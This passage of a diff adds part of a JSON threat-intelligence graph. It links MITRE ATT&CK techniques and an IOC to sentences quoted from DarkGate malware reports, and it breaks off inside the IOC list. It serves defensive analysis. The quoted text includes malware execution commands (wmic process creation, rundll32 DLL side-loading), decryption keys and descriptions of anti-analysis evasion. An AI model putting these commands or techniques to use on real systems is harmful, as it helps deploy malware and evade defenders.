+        "best_span_ranges": [
+          [
+            11,
+            11
+          ]
+        ],
+        "edges": [
+          "EDGE_566f75f9b654"
+        ],
+        "source": {
+          "TTP:T1555_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                11,
+                11
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Initial triage by the Detection and Response Team (DRT) identified the presence of a suspicious VBS file and the harvesting of credentials from browser databases, suggesting the presence of an infostealer infection of some type."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "Analysis of browser history on a victim device identified that the initial vector was a LinkedIn message which directed the victim to hxxps://g2[.]by/jd-Corsair, which then redirected the victim to a file hosted on Google Drive.",
+            "The initial infection vector being via a LinkedIn message is a typical method seen by WithSecure Intelligence in DuckTail campaigns, and Ducktail appears to be used by a cluster of different yet related Vietnamese threat actors."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            12,
+            13
+          ]
+        ],
+        "edges": [
+          "EDGE_21aa7c202a2e",
+          "EDGE_6565b90100f3",
+          "EDGE_95399637fb1d",
+          "EDGE_b17411060c7f",
+          "EDGE_ec046239d9b9"
+        ],
+        "source": {
+          "TTP:T1566_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                12,
+                13
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Analysis of browser history on a victim device identified that the initial vector was a LinkedIn message which directed the victim to hxxps://g2[.]by/jd-Corsair, which then redirected the victim to a file hosted on Google Drive.",
+                "The initial infection vector being via a LinkedIn message is a typical method seen by WithSecure Intelligence in DuckTail campaigns, and Ducktail appears to be used by a cluster of different yet related Vietnamese threat actors."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1001",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1001",
+        "ttp_id": "T1001",
+        "best_span_sentences_list": [
+          [
+            "DarkGate C2 traffic uses unencrypted HTTP requests, but the data is obfuscated and appears as Base64-encoded text."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            42,
+            42
+          ]
+        ],
+        "edges": [
+          "EDGE_247e159a0a7b"
+        ],
+        "source": {
+          "TTP:T1001_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                42,
+                42
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "DarkGate C2 traffic uses unencrypted HTTP requests, but the data is obfuscated and appears as Base64-encoded text."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1041",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1041",
+        "ttp_id": "T1041",
+        "best_span_sentences_list": [
+          [
+            "In our infection run March 14, 2024, we saw what appears to have been data exfiltration in five HTTP POST requests sending nearly 218 KB of data as shown below in Figure 15."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            45,
+            45
+          ]
+        ],
+        "edges": [
+          "EDGE_db63c64b77af"
+        ],
+        "source": {
+          "TTP:T1041_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                45,
+                45
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In our infection run March 14, 2024, we saw what appears to have been data exfiltration in five HTTP POST requests sending nearly 218 KB of data as shown below in Figure 15."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1057",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1057",
+        "ttp_id": "T1057",
+        "best_span_sentences_list": [
+          [
+            "DarkGate malware not only checks for CPU information and anti-malware programs but also scans the host's running processes.",
+            "It does this to ensure normal Windows processes are running, but no processes that could be used for malware analysis or processes that indicate a virtual machine (VM) environment."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            30,
+            31
+          ]
+        ],
+        "edges": [
+          "EDGE_9d355464b6cc"
+        ],
+        "source": {
+          "TTP:T1057_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                30,
+                31
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "DarkGate malware not only checks for CPU information and anti-malware programs but also scans the host's running processes.",
+                "It does this to ensure normal Windows processes are running, but no processes that could be used for malware analysis or processes that indicate a virtual machine (VM) environment."
+              ]
+            ]
+          },
+          "TTP:T1057_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                14,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The malware enumerates the processes and saves the list of process names separated by “|.” It detects the security software based on either the presence of the installation directory or by the presence of the process name related to the security software.",
+                "If security software is detected, the malware sets the corresponding flag and initializes the name string for that security software.",
+                "If the malware does not find any security software, then it considers the presence of Windows Defender and initializes the flag and name values accordingly.",
+                "Flag values are used to alter malware behavior based on the presence of particular security software."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1082",
+        "ttp_id": "T1082",
+        "best_span_sentences_list": [
+          [
+            "One of the anti-analysis techniques employed by DarkGate is identifying the CPU of the targeted system.",
+            "This can reveal if the threat is running in a virtual environment or on a physical host, enabling DarkGate to cease operations to avoid being analyzed in a controlled environment."
+          ],
+          [
+            "After gathering information about the targeted system's hardware, anti-malware programs and running processes, DarkGate malware incorporates this data into its decryption routine for its configuration."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            24,
+            25
+          ],
+          [
+            32,
+            32
+          ]
+        ],
+        "edges": [
+          "EDGE_4ff17eaa267a",
+          "EDGE_e822665e0329",
+          "EDGE_f3a76ed36a38"
+        ],
+        "source": {
+          "TTP:T1082_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                24,
+                25
+              ],
+              [
+                32,
+                32
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "One of the anti-analysis techniques employed by DarkGate is identifying the CPU of the targeted system.",
+                "This can reveal if the threat is running in a virtual environment or on a physical host, enabling DarkGate to cease operations to avoid being analyzed in a controlled environment."
+              ],
+              [
+                "After gathering information about the targeted system's hardware, anti-malware programs and running processes, DarkGate malware incorporates this data into its decryption routine for its configuration."
+              ]
+            ]
+          },
+          "TTP:T1082_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                1,
+                2
+              ],
+              [
+                19,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware.",
+                "DarkGate, distributed via an AutoIt script, enabled remote control over the user's machine, executed malicious commands, gathered system information, and connected to a command-and-control server."
+              ],
+              [
+                "Then, the following discovery commands were executed by Autoit3.exe:\nprocessCmd: \"c:\\temp\\test\\Autoit3.exe\" c:\\temp\\test\\script.a3x\nobjectCmd: \"c:\\windows\\system32\\cmd.exe\" /c wmic ComputerSystem get domain > C:\\ProgramData\\fcdcdfc\\kcbbbbc\nThis command retrieves information about the system's domain and saves the output to the file kcbbbbc inside the folder C:\\ProgramData\\fcdcdfc."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1083",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1083",
+        "ttp_id": "T1083",
+        "best_span_sentences_list": [
+          [
+            "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "edges": [
+          "EDGE_31f579b6f804",
+          "EDGE_e108730fdcdf",
+          "EDGE_3ffa7ef2c7d9",
+          "EDGE_bd57bdfa8d77"
+        ],
+        "source": {
+          "TTP:T1083_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                19,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+              ]
+            ]
+          },
+          "TTP:T1083_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                14,
+                17
+              ],
+              [
+                26,
+                26
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The malware enumerates the processes and saves the list of process names separated by “|.” It detects the security software based on either the presence of the installation directory or by the presence of the process name related to the security software.",
+                "If security software is detected, the malware sets the corresponding flag and initializes the name string for that security software.",
+                "If the malware does not find any security software, then it considers the presence of Windows Defender and initializes the flag and name values accordingly.",
+                "Flag values are used to alter malware behavior based on the presence of particular security software."
+              ],
+              [
+                "The malware also checks for the presence of the directory “c:\\debug” to display a debug message with the DarkGate version number."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1132",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1132",
+        "ttp_id": "T1132",
+        "best_span_sentences_list": [
+          [
+            "DarkGate C2 traffic uses unencrypted HTTP requests, but the data is obfuscated and appears as Base64-encoded text."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            42,
+            42
+          ]
+        ],
+        "edges": [
+          "EDGE_4880b64ed41e"
+        ],
+        "source": {
+          "TTP:T1132_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                42,
+                42
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "DarkGate C2 traffic uses unencrypted HTTP requests, but the data is obfuscated and appears as Base64-encoded text."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1140",
+        "ttp_id": "T1140",
+        "best_span_sentences_list": [
+          [
+            "If C:/ProgramData/Kaspersky Lab does not exist, the PowerShell script downloads ASCII text representing hexadecimal code for Autohotkey.exe, saves the result as a.bin and uses certutil.exe with the -decodehex parameter to decode a.bin to the AutoHotKey.exe binary."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            21,
+            21
+          ]
+        ],
+        "edges": [
+          "EDGE_503e22895c06",
+          "EDGE_f42f44553c7b",
+          "EDGE_0597eeb03db2",
+          "EDGE_d7a4d90eea89",
+          "EDGE_fb32f167dcc1"
+        ],
+        "source": {
+          "TTP:T1140_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                21,
+                21
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "If C:/ProgramData/Kaspersky Lab does not exist, the PowerShell script downloads ASCII text representing hexadecimal code for Autohotkey.exe, saves the result as a.bin and uses certutil.exe with the -decodehex parameter to decode a.bin to the AutoHotKey.exe binary."
+              ]
+            ]
+          },
+          "TTP:T1140_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                10,
+                10
+              ],
+              [
+                18,
+                18
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The loader reads the script file and retrieves the encrypted DarkGate bytes using the marker value “GDrdcpJy.” The malware decrypts the DarkGate binary with the key “GDrdcpJy” using the EncryptDecrypt algorithm, which is explained in the malware initialization section."
+              ],
+              [
+                "The malware decrypts the configuration data from memory with the key “ckcilIcconnh” using an XOR-based algorithm."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1497",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1497",
+        "ttp_id": "T1497",
+        "best_span_sentences_list": [
+          [
+            "One of the anti-analysis techniques employed by DarkGate is identifying the CPU of the targeted system.",
+            "This can reveal if the threat is running in a virtual environment or on a physical host, enabling DarkGate to cease operations to avoid being analyzed in a controlled environment."
+          ],
+          [
+            "DarkGate malware not only checks for CPU information and anti-malware programs but also scans the host's running processes.",
+            "It does this to ensure normal Windows processes are running, but no processes that could be used for malware analysis or processes that indicate a virtual machine (VM) environment."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            24,
+            25
+          ],
+          [
+            30,
+            31
+          ]
+        ],
+        "edges": [
+          "EDGE_6c4003b26fca",
+          "EDGE_484f3393a76c",
+          "EDGE_66240d55c988",
+          "EDGE_69884df40331",
+          "EDGE_d16a1a28e87f"
+        ],
+        "source": {
+          "TTP:T1497_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                24,
+                25
+              ],
+              [
+                30,
+                31
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "One of the anti-analysis techniques employed by DarkGate is identifying the CPU of the targeted system.",
+                "This can reveal if the threat is running in a virtual environment or on a physical host, enabling DarkGate to cease operations to avoid being analyzed in a controlled environment."
+              ],
+              [
+                "DarkGate malware not only checks for CPU information and anti-malware programs but also scans the host's running processes.",
+                "It does this to ensure normal Windows processes are running, but no processes that could be used for malware analysis or processes that indicate a virtual machine (VM) environment."
+              ]
+            ]
+          },
+          "TTP:T1497_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                27,
+                27
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Malware delays execution for some time if the user is focused on the Process Hacker or Process Monitor window, to avoid malicious activity observation from the user."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1518",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1518",
+        "ttp_id": "T1518",
+        "best_span_sentences_list": [
+          [
+            "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "edges": [
+          "EDGE_04e7ed5f3537",
+          "EDGE_3e71bc52f830",
+          "EDGE_677fceb3187f",
+          "EDGE_6dc41c83552a",
+          "EDGE_e469988e3784",
+          "EDGE_49f5e18a6217",
+          "EDGE_606c4950751b"
+        ],
+        "source": {
+          "TTP:T1518_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                19,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+              ]
+            ]
+          },
+          "TTP:T1518_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                14,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The malware enumerates the processes and saves the list of process names separated by “|.” It detects the security software based on either the presence of the installation directory or by the presence of the process name related to the security software.",
+                "If security software is detected, the malware sets the corresponding flag and initializes the name string for that security software.",
+                "If the malware does not find any security software, then it considers the presence of Windows Defender and initializes the flag and name values accordingly.",
+                "Flag values are used to alter malware behavior based on the presence of particular security software."
+              ]
+            ]
+          },
+          "TTP:T1518_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A replicated scenario of this attack shows that Autoit3.exe is looking for multiple well-known antivirus products."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "Figure 1: PDF file containing download link\nVBScript\nFunction names and variable names in VBScript code are obfuscated, and large comments are added to harden the readability of the code."
+          ],
+          [
+            "The loader reads the script file and retrieves the encrypted DarkGate bytes using the marker value “GDrdcpJy.” The malware decrypts the DarkGate binary with the key “GDrdcpJy” using the EncryptDecrypt algorithm, which is explained in the malware initialization section."
+          ],
+          [
+            "The malware decrypts the configuration data from memory with the key “ckcilIcconnh” using an XOR-based algorithm."
+          ],
+          [
+            "Figure 12: EncryptDecrypt algorithm\nThe decrypted data is a representation of key-value pairs, where keys are integer indexes and values are either “Yes” or “No” flags or can be data used by the malware.",
+            "The malware creates the hash-encrypted named mainfolder “dehffdh” in “C:\\ProgramData.” Instead of “C:\\ProgramData,” the malware uses the directory “C:\\” if any of the Avast or AVG security software is present on the victim’s machine.",
+            "The malware creates other folders and files in the mainfolder.",
+            "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            10,
+            10
+          ],
+          [
+            18,
+            18
+          ],
+          [
+            21,
+            24
+          ]
+        ],
+        "edges": [
+          "EDGE_0f5cecea3254",
+          "EDGE_2754d48dfd1f",
+          "EDGE_bbe10a5dde11",
+          "EDGE_c67671397498",
+          "EDGE_f5592323015b",
+          "EDGE_c847278af20a",
+          "EDGE_d1dd5283ba8c"
+        ],
+        "source": {
+          "TTP:T1027_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                10,
+                10
+              ],
+              [
+                18,
+                18
+              ],
+              [
+                21,
+                24
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Figure 1: PDF file containing download link\nVBScript\nFunction names and variable names in VBScript code are obfuscated, and large comments are added to harden the readability of the code."
+              ],
+              [
+                "The loader reads the script file and retrieves the encrypted DarkGate bytes using the marker value “GDrdcpJy.” The malware decrypts the DarkGate binary with the key “GDrdcpJy” using the EncryptDecrypt algorithm, which is explained in the malware initialization section."
+              ],
+              [
+                "The malware decrypts the configuration data from memory with the key “ckcilIcconnh” using an XOR-based algorithm."
+              ],
+              [
+                "Figure 12: EncryptDecrypt algorithm\nThe decrypted data is a representation of key-value pairs, where keys are integer indexes and values are either “Yes” or “No” flags or can be data used by the malware.",
+                "The malware creates the hash-encrypted named mainfolder “dehffdh” in “C:\\ProgramData.” Instead of “C:\\ProgramData,” the malware uses the directory “C:\\” if any of the Avast or AVG security software is present on the victim’s machine.",
+                "The malware creates other folders and files in the mainfolder.",
+                "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+              ]
+            ]
+          },
+          "TTP:T1027_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                16,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The encrypted AutoIt payload script.a3x decrypts itself in memory as shellcode and injects itself into remote processes.",
+                "One observed example was the legitimate binary for MicrosoftEdgeUpdateCore.exe, located in C:\\Program Files (x86)\\Microsoft\\EdgeUpdate."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1047",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1047",
+        "ttp_id": "T1047",
+        "best_span_sentences_list": [
+          [
+            "The malware retrieves the compressed data using the regular expression “'\\s(+)(\\r?\\n|$)” and extracts files into “C:\\Default\\Autoit3.exe” and “C:\\Default\\script.a3x.” The malware executes the compiled AutoIt3 (AU3) script file using the WMIC command “wmic process call create \"cmd /c C:\\Default\\Autoit3.exe C:\\Default\\script.a3x\"” which further continues the execution of the malware."
+          ],
+          [
+            "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ],
+          [
+            24,
+            24
+          ]
+        ],
+        "edges": [
+          "EDGE_4f93f47efc8d",
+          "EDGE_6a0052bf3bec",
+          "EDGE_d7b40a08508c",
+          "EDGE_fe71ab0d9472"
+        ],
+        "source": {
+          "TTP:T1047_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ],
+              [
+                24,
+                24
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The malware retrieves the compressed data using the regular expression “'\\s(+)(\\r?\\n|$)” and extracts files into “C:\\Default\\Autoit3.exe” and “C:\\Default\\script.a3x.” The malware executes the compiled AutoIt3 (AU3) script file using the WMIC command “wmic process call create \"cmd /c C:\\Default\\Autoit3.exe C:\\Default\\script.a3x\"” which further continues the execution of the malware."
+              ],
+              [
+                "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "The PDF file disguises itself as an invoice file dated “26 Jun2024” and contains a download button that redirects to a compromised website to download a malicious VBScript file.",
+            "Figure 1: PDF file containing download link\nVBScript\nFunction names and variable names in VBScript code are obfuscated, and large comments are added to harden the readability of the code."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            0,
+            1
+          ]
+        ],
+        "edges": [
+          "EDGE_8b7ac22421b8",
+          "EDGE_98fe7923479d"
+        ],
+        "source": {
+          "TTP:T1204_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                0,
+                1
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The PDF file disguises itself as an invoice file dated “26 Jun2024” and contains a download button that redirects to a compromised website to download a malicious VBScript file.",
+                "Figure 1: PDF file containing download link\nVBScript\nFunction names and variable names in VBScript code are obfuscated, and large comments are added to harden the readability of the code."
+              ]
+            ]
+          },
+          "TTP:T1204_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                7,
+                7
+              ],
+              [
+                9,
+                9
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware."
+              ],
+              [
+                "The attacker then instructed the victim to download AnyDesk via browser and manipulate the user to enter her credentials to AnyDesk."
+              ],
+              [
+                "The execution of AnyDesk.exe was observed seconds after downloading the application."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1021",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1021",
+        "ttp_id": "T1021",
+        "best_span_sentences_list": [
+          [
+            "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ]
+        ],
+        "edges": [
+          "EDGE_3c15311336e2",
+          "EDGE_a87cdffceca2",
+          "EDGE_ff420cce3530"
+        ],
+        "source": {
+          "TTP:T1021_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1218",
+        "ttp_id": "T1218",
+        "best_span_sentences_list": [
+          [
+            "The command ran is as follows:\n“C:\\Users\\<user>\\Downloads\\AnyDesk.exe\" --local-service\nThis command runs the AnyDesk remote desktop application and starts it as a local service on the system, allowing it to operate with elevated privileges or in a minimized/automated fashion.",
+            "A few minutes after, cmd.exe was invoked to execute rundll32.exe to load SafeStore.dll, which we assumed were dropped via AnyDesk.exe.",
+            "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3).",
+            "There are multiple functions exported by the DLL that can be used to execute the malware (Figure 4).",
+            "The executable file SystemCert.exe (SHA256: 4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1), which we believed was dropped via AnyDesk.exe, was executed and created script.a3x and Autoit3.exe in the C:\\Temp\\test\\ folder (Figure 7)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            10,
+            14
+          ]
+        ],
+        "edges": [
+          "EDGE_a8ae74f285cc",
+          "EDGE_e332f70508b6"
+        ],
+        "source": {
+          "TTP:T1218_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                10,
+                14
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The command ran is as follows:\n“C:\\Users\\<user>\\Downloads\\AnyDesk.exe\" --local-service\nThis command runs the AnyDesk remote desktop application and starts it as a local service on the system, allowing it to operate with elevated privileges or in a minimized/automated fashion.",
+                "A few minutes after, cmd.exe was invoked to execute rundll32.exe to load SafeStore.dll, which we assumed were dropped via AnyDesk.exe.",
+                "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3).",
+                "There are multiple functions exported by the DLL that can be used to execute the malware (Figure 4).",
+                "The executable file SystemCert.exe (SHA256: 4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1), which we believed was dropped via AnyDesk.exe, was executed and created script.a3x and Autoit3.exe in the C:\\Temp\\test\\ folder (Figure 7)."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1574",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1574",
+        "ttp_id": "T1574",
+        "best_span_sentences_list": [
+          [
+            "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            12,
+            12
+          ]
+        ],
+        "edges": [
+          "EDGE_e81319cf8f1c"
+        ],
+        "source": {
+          "TTP:T1574_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                12,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3)."
+              ]
+            ]
+          }
+        }
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_063e6c5e7721",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "g2[.]by",
+        "edges": [
+          "EDGE_6565b90100f3"
+        ],
+        "source": {
+          "g2[.]by_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              12,
